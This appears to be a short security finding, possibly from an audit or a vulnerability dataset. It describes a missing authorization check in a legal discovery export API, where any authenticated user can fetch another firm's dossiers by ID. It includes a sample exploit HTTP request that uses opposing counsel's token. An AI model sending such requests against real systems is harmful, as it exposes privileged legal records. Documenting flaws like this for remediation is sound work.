diagnosis: The legal discovery dossier export route uses Zod to validate the dossierId pattern, but queries LegalDiscoveryStore solely by req.validParams.dossierId without checking whether the requesting user or law firm is retained on that matter. An attacker can enumerate case files and read privileged deposition transcripts across rival firms.
exploit_request:
GET /api/legal/discovery/DOS-PATENT09/export HTTP/1.1
Host: discovery.lawportal.internal:7007
Authorization: Bearer <opposing_counsel_jwt>
Accept: application/json
